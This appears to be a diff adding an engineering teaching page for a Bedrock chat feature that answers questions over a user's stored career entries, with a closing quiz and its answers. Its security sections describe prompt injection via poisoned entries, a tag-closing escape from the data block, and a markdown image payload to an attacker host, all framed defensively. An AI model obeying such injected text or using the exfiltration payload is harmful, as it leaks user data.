@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chat over your data: routing, grounding, and a security boundary that wasn&#x27;t</title>
+</head>
+<body>
+<style>
+  :root {
+    --bg: #fafaf8; --fg: #1a1a1a; --accent: #b5541f; --muted: #6b6b6b;
+    --code-bg: #282c34; --code-fg: #e6e6e6; --callout-bg: #fff4e8; --border: #e0ddd6;
+  }
+  body { font-family: Georgia, 'Times New Roman', serif; background: var(--bg); color: var(--fg);
+    max-width: 820px; margin: 0 auto; padding: 2rem 1.5rem 6rem; line-height: 1.65; }
+  h1 { font-size: 1.9rem; border-bottom: 3px solid var(--accent); padding-bottom: .5rem; }
+  h2 { font-size: 1.4rem; margin-top: 3rem; color: var(--accent); }
+  h3 { font-size: 1.1rem; margin-top: 1.8rem; }
+  code { font-family: 'SF Mono', Consolas, monospace; background: #eee; padding: .1rem .3rem; border-radius: 3px; font-size: .92em; }
+  pre { background: var(--code-bg); color: var(--code-fg); padding: 1rem 1.2rem; border-radius: 8px;
+    overflow-x: auto; white-space: pre-wrap; font-family: 'SF Mono', Consolas, monospace; font-size: .88rem; line-height: 1.5; }
+  pre code { background: none; padding: 0; color: inherit; }
+  .callout { background: var(--callout-bg); border-left: 4px solid var(--accent); padding: .9rem 1.2rem;
+    border-radius: 0 6px 6px 0; margin: 1.2rem 0; }
+  .toc { background: #fff; border: 1px solid var(--border); border-radius: 8px; padding: 1rem 1.5rem; margin: 1.5rem 0; }
+  .toc a { color: var(--accent); text-decoration: none; }
+  .toc ul { margin: .3rem 0; }
+  .diagram { background: #fff; border: 1px solid var(--border); border-radius: 10px; padding: 1.2rem;
+    margin: 1.2rem 0; font-family: 'SF Mono', Consolas, monospace; font-size: .85rem; }
+  .flow { display: flex; align-items: center; gap: .6rem; flex-wrap: wrap; justify-content: center; padding: .5rem 0; }
+  .box { border: 2px solid var(--accent); border-radius: 8px; padding: .6rem 1rem; background: #fdf6ee; text-align: center; min-width: 120px; }
+  .box.fail { border-color: #b91c1c; background: #fef2f2; }
+  .arrow { font-size: 1.4rem; color: var(--muted); }
+  table { border-collapse: collapse; width: 100%; margin: 1rem 0; font-size: .92rem; }
+  th, td { border: 1px solid var(--border); padding: .5rem .7rem; text-align: left; }
+  th { background: #f0ede6; }
+  .quiz-q { background: #fff; border: 1px solid var(--border); border-radius: 10px; padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+  .quiz-opt { display: block; width: 100%; text-align: left; padding: .6rem 1rem; margin: .4rem 0;
+    border: 1px solid var(--border); border-radius: 6px; background: #fff; cursor: pointer; font-family: inherit; font-size: .95rem; }
+  .quiz-opt:hover { background: #f5f2ec; }
+  .feedback { display: none; margin-top: .6rem; padding: .6rem 1rem; border-radius: 6px; font-size: .9rem; }
+  .feedback.correct { background: #ecfdf3; color: #166534; border-left: 3px solid #16a34a; }
+  .feedback.incorrect { background: #fef2f2; color: #991b1b; border-left: 3px solid #dc2626; }
+  .badge { display: inline-block; font-size: .75rem; padding: .15rem .5rem; border-radius: 10px; font-family: sans-serif; }
+  .badge.new { background: #dcfce7; color: #166534; }
+  @media (max-width: 600px) { body { padding: 1rem; } .flow { flex-direction: column; } }
+</style>
+
+<h1>Chat over your data: routing, grounding, and a security boundary that wasn&#x27;t</h1>
+<p style="color:var(--muted); margin-top:-.5rem;">CareerVault Phase 2, slice 7 · prepared 2026-07-28 · ADR-038, architecture v2.0</p>
+
+<div class="toc">
+<strong>Contents</strong>
+<ul>
+  <li><a href="#background">Background</a></li>
+  <li><a href="#intuition">Intuition</a></li>
+  <li><a href="#code">Code walkthrough</a></li>
+  <li><a href="#quiz">Quiz</a></li>
+</ul>
+</div>
+
+<h2 id="background">Background</h2>
+
+<p>This slice changes what happens when you type a sentence into CareerVault's chat box. Until now
+the chat had exactly one job: turn something you <em>tell</em> it into a structured entry. After
+this slice it can also answer things you <em>ask</em> it about the history you have already
+recorded. That sounds like a small addition. It turns out to touch the tool-use contract, the
+retrieval design, and a security claim in the architecture document that — as we will see — was
+never quite true.</p>
+
+<h3>Skippable background: the AWS and LLM machinery underneath</h3>
+
+<p>If you already know what a Lambda, an embedding, and Bedrock's Converse API are, skip to the
+next subsection.</p>
+
+<p><strong>Lambda</strong> is AWS's function-as-a-service: you hand AWS a zip of code and a handler
+name, and it runs that function on demand, billing per millisecond. There is no server you keep
+alive. Two consequences shape everything here. First, a Lambda is <em>stateless between
+invocations</em> — you cannot cache the conversation in a variable and expect it to survive to the
+next message, because the next message may land on a completely different container. That is why
+the chat handler re-reads the conversation from DynamoDB on every single turn. Second, a Lambda has
+an <strong>IAM role</strong>: a policy document listing exactly which AWS API calls that code is
+permitted to make. This is the primary security boundary in a serverless system, and it becomes
+the interesting part of this slice.</p>
+
+<p><strong>DynamoDB</strong> is AWS's managed NoSQL database. CareerVault uses a
+<em>single-table design</em> (ADR-005): every entity — your profile, your entries, your chat
+messages, your résumé runs — lives in one table, distinguished by the shape of its keys. Each item
+has a partition key (<code>PK</code>) and a sort key (<code>SK</code>):</p>
+
+<div class="diagram">
+<table>
+<tr><th>Entity</th><th>PK</th><th>SK</th></tr>
+<tr><td>Profile</td><td><code>USER#abc123</code></td><td><code>PROFILE</code></td></tr>
+<tr><td>Career entry</td><td><code>USER#abc123</code></td><td><code>ENTRY#01ARZ3ND…</code></td></tr>
+<tr><td>Chat message</td><td><code>USER#abc123</code></td><td><code>CONVO#01BX5Z…#01C9…</code></td></tr>
+</table>
+</div>
+
+<p>Notice that <strong>every item for one user shares the same partition key</strong>. Only the sort
+key prefix distinguishes an entry from a chat message. Hold onto that fact; it is the hinge of the
+security correction later in this page.</p>
+
+<p><strong>Embeddings</strong> are how the retrieval works. An embedding model reads a piece of text
+and returns a list of numbers — for Amazon's Titan Text Embeddings v2, a list of 1024 floats — that
+encodes the text's <em>meaning</em> rather than its spelling. Texts about similar things land near
+each other in that 1024-dimensional space. "Near" is measured by <strong>cosine similarity</strong>:
+the cosine of the angle between two vectors, which runs from 1.0 (identical direction) down through
+0.0 (unrelated) to -1.0 (opposite). CareerVault stores an embedding on every entry when it is
+written, then compares vectors in memory inside the Lambda rather than paying for a managed vector
+database (ADR-016 and ADR-028) — for one person's career history, that is milliseconds of arithmetic
+over a few dozen items.</p>
+
+<p><strong>Bedrock's Converse API</strong> is the uniform chat interface across every model AWS
+hosts. The part that matters here is <strong>tool use</strong>. You describe some functions in JSON
+Schema, hand them to the model, and instead of replying with prose the model may reply with a
+structured call: "invoke <code>propose_entry</code> with these arguments." Crucially, Bedrock
+validates those arguments against your schema before you ever see them. That is why this codebase
+gets structured output through tools rather than by asking the model to "reply with JSON" — no
+JSON-repair code, no prose wrapped around the object, no hallucinated extra fields.</p>
+
+<h3>The narrow background: how CareerVault's chat worked before this slice</h3>
+
+<p>Architecture §3.1.2 calls it <strong>the two-tool pattern</strong>. Each turn, the chat Lambda
+hands Haiku exactly two tools and sets <code>toolChoice</code> to <code>any</code>:</p>
+
+<div class="diagram">
+<table>
+<tr><th>Tool</th><th>Purpose</th></tr>
+<tr><td><code>propose_entry</code></td><td>Emit a structured career entry candidate</td></tr>
+<tr><td><code>ask_clarification</code></td><td>Ask one focused follow-up question</td></tr>
+</table>
+</div>
+
+<p><code>toolChoice</code> has three settings, and the difference between them is the whole story of
+this slice:</p>
+
+<div class="diagram">
+<table>
+<tr><th>Setting</th><th>Meaning</th></tr>
+<tr><td><code>auto</code></td><td>The model may call a tool <em>or</em> reply with free text.</td></tr>
+<tr><td><code>any</code></td><td>The model <strong>must</strong> call one of the tools; it picks which.</td></tr>
+<tr><td><code>tool</code></td><td>The model must call one specific named tool.</td></tr>
+</table>
+</div>
+
+<p><code>any</code> is a strong guarantee: the model is <em>structurally incapable</em> of replying
+with chatty prose. Every turn produces a schema-validated object. The same primitive exists as
+<code>tool_choice: "required"</code> in Azure OpenAI and as function-calling mode <code>ANY</code>
+in Vertex AI Gemini.</p>
+
+<div class="callout">
+<strong>The latent bug.</strong> Look at that table again and ask: what happens when the user types
+"how many certifications do I have?" There is no tool that fits a question. But
+<code>toolChoice=any</code> means the model <em>must</em> call one. So it is forced to bend the
+question into <code>ask_clarification</code> (mildly wrong) or into <code>propose_entry</code>
+(genuinely wrong — a question becomes a proposed career entry). Slice 7's exit criterion "a question
+can't accidentally create an entry" reads like a hazard the new feature must avoid introducing. It
+is actually a <em>defect in the existing design</em>, and routing is the fix.
+</div>
+
+
+<h2 id="intuition">Intuition</h2>
+
+<p>The goal is to let one endpoint serve two very different kinds of message. Compare:</p>
+
+<div class="diagram">
+<table>
+<tr><th>You type</th><th>You mean</th><th>Should produce</th></tr>
+<tr><td>"I passed AZ-900 in March"</td><td>Record this</td><td>An entry candidate to confirm</td></tr>
+<tr><td>"which certs do I have?"</td><td>Tell me about my data</td><td>An answer grounded in that data</td></tr>
+</table>
+</div>
+
+<h3>Why not just let the model talk?</h3>
+
+<p>The tempting simplification is to flip <code>toolChoice</code> to <code>auto</code>: let the model
+call a tool when ingesting and reply with plain text when answering. ADR-038 rejects this for two
+reasons, and both are worth internalising.</p>
+
+<p>First, <strong>the answer would be ungrounded</strong>. The model has never seen your entries. It
+would answer "which certs do I have?" from the conversation and its own priors — which is to say, it
+would make something up. Grounding requires retrieval, and retrieval has to happen <em>somewhere</em>
+regardless of how routing works.</p>
+
+<p>Second, and more subtly, <code>auto</code> <strong>gives away a guarantee that already-working
+code depends on</strong>. Under <code>any</code>, ingestion cannot degrade into chattiness. Under
+<code>auto</code>, the model becomes free to reply "Nice, congratulations on the cert!" where it used
+to emit a structured candidate — and this codebase has already observed that Haiku at
+<code>temperature=0</code> is not run-to-run deterministic. Trading a known-good ingestion path for
+routing convenience is a bad trade.</p>
+
+<h3>The shape that was chosen: a third tool that does nothing</h3>
+
+<p>Instead, slice 7 adds a third tool, <code>answer_question</code>, and keeps
+<code>toolChoice=any</code> exactly as it was. The trick is that this tool has <strong>no
+action</strong>. It does not answer anything. It exists so the model can <em>signal</em> "this turn
+is a question" and hand back a search query, in a typed way. The architecture already had a name for
+this: a <strong>control-flow tool</strong>, the same pattern the résumé agent uses for
+<code>retrieval_done</code> and <code>submit_critique</code> (§3.2).</p>
+
+<p>Once the model has signalled, the Lambda takes over. A question turn becomes three steps, only
+the first and last of which involve a model at all:</p>
+
+<div class="diagram">
+<div class="flow">
+  <div class="box">User message<br><small>"how many certs<br>do I have?"</small></div>
+  <div class="arrow">→</div>
+  <div class="box">Haiku #1<br><small>3 tools, toolChoice=any<br>→ answer_question(query)</small></div>
+  <div class="arrow">→</div>
+  <div class="box">Lambda<br><small>Titan embed<br>+ cosine rank<br>+ top-8</small></div>
+  <div class="arrow">→</div>
+  <div class="box">Haiku #2<br><small><strong>no tools</strong><br>grounded answer</small></div>
+</div>
+</div>
+
+<p>The middle box contains no model. That is deliberate, and it is the single most important
+security property of the design: <strong>a hijacked model can influence the query string, but cannot
+choose which entries are read or how many.</strong> Compare the alternative that was rejected — a
+<code>search_entries</code> tool the model calls in a loop — where the model controls the query, the
+iteration count, and therefore the cost.</p>
+
+<h3>The counting problem</h3>
+
+<p>Here is the part that turned out to matter most in practice. Semantic top-<em>k</em> answers the
+question <em>"what is most like this query?"</em> It is a <strong>ranking</strong> mechanism. But
+"how many AWS certs do I have?" is a <strong>filter-and-count</strong> question, and an embedding
+index is simply the wrong tool for it.</p>
+
+<p>The failure is worse than vagueness. Watch what happens with a real corpus of 13 entries — 7
+jobs, 4 certs, 2 degrees — and a top-<em>k</em> of 8:</p>
+
+<div class="diagram">
+<div class="flow">
+  <div class="box">Corpus<br><small>13 entries<br>(4 are certs)</small></div>
+  <div class="arrow">→</div>
+  <div class="box">rank by similarity<br><small>take top 8</small></div>
+  <div class="arrow">→</div>
+  <div class="box fail">Model sees<br>8 entries<br><small>answers <strong>"8"</strong></small></div>
+</div>
+<p style="text-align:center;margin-top:.8rem"><small>Top-<em>k</em> structurally biases a count
+toward <em>k</em>. The wrong answer is confident and predictable.</small></p>
+</div>
+
+<p>The fix rests on an observation about code that was already there.
+<code>query_entries()</code> does not fetch the top matches from the database — it reads
+<strong>every</strong> entry into Lambda memory, paginating to completion, and only <em>then</em>
+does the ranking happen in Python. The whole corpus is already in hand. Top-<em>k</em> is a
+<strong>compression we choose</strong>, not a ceiling we are under.</p>
+
+<p>So slice 7 computes a <strong>census</strong> — counts by entry type across the whole corpus —
+and puts it in the prompt alongside the retrieved slice, clearly labelled as describing different
+things:</p>
+
+<div class="diagram">
+<pre>&lt;career_history&gt;
+&lt;census note="counts across ALL recorded entries, not just those shown below"&gt;
+  JOB: 7
+  CERT: 4
+  EDUCATION: 2
+  TOTAL: 13
+&lt;/census&gt;
+&lt;relevant_entries note="the entries most similar to the question; NOT the full history"&gt;
+  &lt;entry n="1"&gt;
+    entry_type: CERT
+    title: AWS Certified Cloud Practitioner
+    ...
+  &lt;/entry&gt;
+  ... 7 more ...
+&lt;/relevant_entries&gt;
+&lt;/career_history&gt;</pre>
+</div>
+
+<p>The census costs about eight integers and fifty tokens. On the first live run against the real
+corpus, top-<em>k</em> returned 8 entries of which only 4 were certs — and the answer was
+<strong>"You have 4 certifications."</strong> The principle generalises well beyond this codebase:
+<strong>let Python count, let the model narrate.</strong> Language models are unreliable counters;
+do not hand them the task, hand them the number.</p>
+
+<div class="callout">
+<strong>What is deliberately <em>not</em> built yet.</strong> The complete answer is
+<em>hybrid retrieval</em> — a structured filter branch (<code>entry_type == CERT</code> and issuer
+contains "AWS", evaluated deterministically over the in-memory corpus) sitting alongside the
+semantic branch. That is backlog B-011. Slice 7 ships the cheap 80% (the census) plus an
+<code>intent</code> field on the tool — <code>lookup</code> or <code>aggregate</code> — which is
+populated correctly on every run but only wired to the <code>lookup</code> path. Shipping the field
+unused now means the filter branch is additive later, rather than a schema change plus a migration
+of conversation turns already stored under the old shape.
+</div>
+
+
+<h2 id="code">Code walkthrough</h2>
+
+<p>The change is about 200 lines of production code across four files, plus a new module. It reads
+best in the order the request travels.</p>
+
+<h3>1. The tool schema — <code>pydantic_models/tools.py</code></h3>
+
+<p>The new tool is deliberately tiny. Two fields, both required, and nothing else:</p>
+
+<pre>def _answer_question_input_schema() -&gt; dict:
+    return {
+        "type": "object",
+        "properties": {
+            "query": {"type": "string", "description": "...restated as a self-contained
+                       search query... Resolve pronouns and references to earlier turns..."},
+            "intent": {"type": "string", "enum": ["lookup", "aggregate"], ...},
+        },
+        "required": ["query", "intent"],
+    }</pre>
+
+<p>There is a test asserting the property set is <em>exactly</em>
+<code>{"query", "intent"}</code> — no field through which the model could smuggle a pre-baked answer
+past the retrieval step. The <code>query</code> description asks the model to resolve pronouns
+("that project" → the project's actual name), because the string is going to be embedded in
+isolation, without the conversation around it.</p>
+
+<p>Note what did <em>not</em> change: <code>build_tool_config()</code> still ends with
+<code>"toolChoice": {"any": {}}</code>. That one unchanged line is the whole reason ingestion needs
+no re-testing from first principles.</p>
+
+<h3>2. The grounding module — <code>backend/functions/chat/qa.py</code> (new)</h3>
+
+<p>Everything in this file is a pure function of DynamoDB items: no Bedrock, no boto3, no I/O. That
+is not incidental tidiness. ADR-038's central claim is that retrieval is under the Lambda's control
+rather than the model's — and keeping this module I/O-free is what makes that claim
+<em>testable</em> instead of merely asserted.</p>
+
+<p>The subtlest decision here is how entries get projected into the prompt. The allowlist of fields
+the model may see is <strong>derived from the Pydantic entity models</strong> rather than hand-listed:</p>
+
+<pre>_PROMPT_FIELDS: frozenset[str] = frozenset(
+    name
+    for model in SUBTYPE_MODELS
+    for name in model.model_fields
+    if name != "entry_id"
+)</pre>
+
+<p>A denylist would work today. But if someone later adds an internal field to an entry item, a
+denylist silently starts leaking it into a model prompt, whereas this derivation excludes it
+automatically while including new <em>user</em> fields for free. It is also what keeps the
+1024-float embedding out of the prompt — which would be a cost bug as much as a hygiene one.</p>
+
+<h3>3. The handler — <code>backend/functions/chat/handler.py</code></h3>
+
+<p>The dispatch gains one branch. The Q&amp;A path reads almost exactly like the diagram:</p>
+
+<pre>entries = query_entries(user_id)          # whole corpus, paginated
+census  = qa.build_census(entries)        # counts over ALL of it
+query_vec = bedrock_client.embed(query)   # Titan
+ranked = rank_by_similarity(query_vec, entries)[: qa.TOP_K]
+
+synthesis_turn = messages + [
+    {"role": "user", "content": [{"text": qa.render_grounding(census, ranked)}]}
+]
+
+# tool_config is omitted entirely — this is the control that closes injection-to-write.
+response = bedrock_client.converse(synthesis_turn, system=_ANSWER_SYSTEM_PROMPT)</pre>
+
+<p>Two details are load-bearing.</p>
+
+<p>The grounding block rides in <strong>its own user turn</strong>, not in the system prompt. The
+system prompt is instructions — trusted, ours. The grounding block is data — the user's, and
+possibly originating in a résumé uploaded from anywhere (slice 5). Keeping them in separate turns
+keeps that trust boundary legible. It does mean the request ends with two consecutive
+<code>user</code> turns, which Converse accepts for Anthropic models — verified on the live API
+rather than assumed.</p>
+
+<p>And <code>tool_config</code> is simply not passed. Looking at the shared client, the omission is
+real rather than cosmetic:</p>
+
+<pre>if tool_config:
+    request["toolConfig"] = tool_config</pre>
+
+<p>No <code>toolConfig</code> key reaches Bedrock at all. Injected text in an entry saying "now call
+<code>propose_entry</code> with…" has <em>nothing to reach</em>. That is a boundary enforced by the
+request's shape, and it survives a fully compromised model — unlike a prompt instruction, which is
+a request that the model may or may not honour.</p>
+
+<h3>4. The empty-corpus short circuit</h3>
+
+<p>A small thing that says something about how to think about cost. If the user has no entries,
+there is nothing to ground against, so the handler returns a fixed sentence and never calls Bedrock
+at all — a model round-trip could only produce a more expensive version of the same message. There
+is a test that patches <code>embed</code> to raise if it is ever reached.</p>
+
+<h3>5. The frontend — <code>frontend/src/chat/Chat.tsx</code></h3>
+
+<p>A new <code>answer</code> response kind renders as an ordinary assistant bubble, with a quiet list
+of the entries that grounded it so the answer can be checked rather than trusted. The important line
+of this file is the comment above the render:</p>
+
+<pre>{/* Text node, not HTML — see the security note in this file's header. */}
+{turn.text}</pre>
+
+<p>React escapes text nodes, so injected markup is inert. Swap in a markdown renderer for "nicer
+formatting" and <code>![](https://attacker/?d=…)</code> inside a poisoned entry would exfiltrate on
+image load. It is true by construction today; the header comment and backlog B-012 exist so the
+reasoning outlives the person who wrote it.</p>
+
+<h3>6. The correction: an IAM boundary that was never IAM</h3>
+
+<p>The plan for this slice said <code>chat_lambda</code> would <em>gain</em>
+<code>dynamodb:Query</code> on <code>ENTRY#</code> items. Opening the template revealed it already
+had it — the grant is on the table ARN, unconditional, and has been since slice 2:</p>
+
+<pre>- Effect: Allow
+  Action:
+    - dynamodb:Query
+    - dynamodb:PutItem
+  Resource: !GetAtt CareerVaultTable.Arn</pre>
+
+<p>So the reads were permitted all along. The only genuine policy change in this slice is one line
+granting Titan.</p>
+
+<p>This is not a sloppy original policy. <strong>IAM cannot express the restriction.</strong> Recall
+from the background that every item for a user shares one partition key. The isolation the
+architecture wanted — "chat may only touch <code>CONVO#</code>" — is a <em>sort-key prefix</em>
+restriction, and IAM's <code>dynamodb:LeadingKeys</code> condition scopes the <em>partition</em> key
+only, with no sort-key equivalent. The architecture document already recorded this same limitation
+elsewhere (§4.2.4, for constraining the key being written); §4.2.3's per-Lambda table was simply
+reading as an IAM guarantee when it never was one.</p>
+
+<div class="callout">
+<strong>The portable lesson.</strong> A least-privilege boundary that IAM cannot express is a
+<em>code invariant wearing an IAM costume</em>. It is still worth having — but it must be written
+down as a code invariant, pinned by a test, and never assumed to be enforced by the platform. What
+actually protects the user here is that the handler imports no entry-write helper, which is now
+asserted by a test checking every write carries a <code>CONVO#</code> sort key.
+</div>
+
+<h3>7. What the security review caught</h3>
+
+<p>The first implementation defanged <code>&lt;entry&gt;</code> sequences inside entry content, so a
+malicious entry could not close its own block early. But the grounding block has four structural
+tags, and content closing the <em>outer</em> ones —
+<code>&lt;/relevant_entries&gt;&lt;/career_history&gt;</code> — escaped the data region just as
+effectively. Fixed in-slice by driving the defanging from a <code>_STRUCTURAL_TAGS</code> tuple.</p>
+
+<p>The impact was genuinely low, and it is worth understanding <em>why</em>: this layer is documented
+as defense in depth, explicitly not a boundary. The controls carrying the weight — no
+<code>toolConfig</code> on the synthesis call, model-free retrieval, text-only rendering, partition
+scoping from the JWT — all held throughout, so the worst case was a misleading answer rather than
+escalation or exfiltration. But a control documented as "we delimit the data" should actually
+delimit it.</p>
+
+<h3>Cross-cloud parallel</h3>
+
+<p>The overall shape — a router turn emitting a typed intent, deterministic retrieval owned by the
+application, then a generation turn grounded in what was retrieved — is the standard
+<strong>classify → retrieve → generate</strong> RAG pipeline. What varies across clouds is only
+whether the router is a forced tool call, a small classifier model, or a rules layer. Azure OpenAI's
+<code>tool_choice: "required"</code> and Vertex AI Gemini's function-calling mode <code>ANY</code>
+give you the same forcing primitive this slice depends on.</p>
+
+
+<h2 id="quiz">Quiz</h2>
+
+<div class="quiz-q">
+<p><strong>Why did ADR-038 keep toolChoice=any and add a third tool, rather than switching to toolChoice=auto and letting the model answer questions in free text?</strong></p>
+<button class="quiz-opt" data-correct="false">auto costs more per call because the model must evaluate every tool schema before deciding.</button>
+<button class="quiz-opt" data-correct="false">Bedrock's Converse API does not support toolChoice=auto for Anthropic models.</button>
+<button class="quiz-opt" data-correct="true">auto would have produced ungrounded answers, and it would have surrendered the forced-structured-output guarantee that slice 2b's ingestion path depends on.</button>
+<button class="quiz-opt" data-correct="false">auto would have prevented the model from calling propose_entry at all.</button>
+</div>
+
+<div class="quiz-q">
+<p><strong>With a corpus of 13 entries (4 of them certs) and a top-k of 8, why would a naive semantic-retrieval implementation answer &quot;how many certifications do I have?&quot; incorrectly — and what would it most likely answer?</strong></p>
+<button class="quiz-opt" data-correct="false">It would refuse to answer, because cosine similarity returns no signal for counting questions.</button>
+<button class="quiz-opt" data-correct="false">It would answer 4 correctly, since the cert entries rank highest for a cert-related query.</button>
+<button class="quiz-opt" data-correct="false">It would answer 13, because the model counts the whole corpus regardless of what was retrieved.</button>
+<button class="quiz-opt" data-correct="true">It would answer 8: top-k is a ranking mechanism, so the model counts the k entries placed in front of it rather than the true total.</button>
+</div>
+
+<div class="quiz-q">
+<p><strong>The synthesis call is made without passing tool_config. Why is that a stronger control than instructing the model in the system prompt to ignore embedded instructions?</strong></p>
+<button class="quiz-opt" data-correct="false">System prompts are visible to the user, so instructions placed there can be read and worked around.</button>
+<button class="quiz-opt" data-correct="true">Omitting tool_config means no toolConfig key reaches Bedrock, so there is physically no tool for injected content to invoke — a property of the request shape that holds even if the model is fully compromised.</button>
+<button class="quiz-opt" data-correct="false">Bedrock validates system prompts less strictly than it validates tool schemas.</button>
+<button class="quiz-opt" data-correct="false">It prevents the model from reading entry content at all, so injection has nothing to act on.</button>
+</div>
+
+<div class="quiz-q">
+<p><strong>The architecture claimed chat_lambda could &quot;only touch CONVO# items,&quot; but implementing this slice showed no IAM change was needed to read ENTRY# items. What is the underlying reason?</strong></p>
+<button class="quiz-opt" data-correct="false">The isolation was enforced by a condition key that had been removed during slice 6's deploy.</button>
+<button class="quiz-opt" data-correct="false">The Query grant was scoped to an index that happened to include ENTRY# items as well.</button>
+<button class="quiz-opt" data-correct="false">SAM silently widens DynamoDB grants to the whole table when a function has any Query permission.</button>
+<button class="quiz-opt" data-correct="true">All of a user's items share one partition key, so the wanted isolation is by sort-key prefix — and dynamodb:LeadingKeys scopes only the partition key, with no sort-key equivalent.</button>
+</div>
+
+<div class="quiz-q">
+<p><strong>Why is the corpus census computed in Python and injected into the prompt, rather than asking the model to count the entries it was given?</strong></p>
+<button class="quiz-opt" data-correct="true">The census describes the whole corpus while the retrieved entries are only a similarity-ranked subset, and language models are unreliable counters — so the deterministic count is computed and handed over, leaving the model only to narrate it.</button>
+<button class="quiz-opt" data-correct="false">Bedrock's Converse API cannot return numeric values reliably without a tool schema to validate them.</button>
+<button class="quiz-opt" data-correct="false">Counting in the prompt would exceed Haiku's context window for corpora above about 50 entries.</button>
+<button class="quiz-opt" data-correct="false">The census is needed because query_entries returns only the top-k entries, so the full corpus is never in memory.</button>
+</div>
+
+<script>
+document.querySelectorAll('.quiz-q').forEach(q => {
+  q.querySelectorAll('.quiz-opt').forEach(opt => {
+    opt.addEventListener('click', () => {
+      const correct = opt.dataset.correct === 'true';
+      let fb = opt.nextElementSibling;
+      if (!fb || !fb.classList.contains('feedback')) {
+        fb = document.createElement('div');
+        fb.className = 'feedback';
+        opt.insertAdjacentElement('afterend', fb);
+      }
+      fb.textContent = correct ? '\u2705 Correct.' : '\u274c Not quite \u2014 reread the section above.';
+      fb.className = 'feedback ' + (correct ? 'correct' : 'incorrect');
+      fb.style.display = 'block';
+    });
+  });
+});
+</script>
+
+</body>
+</html>
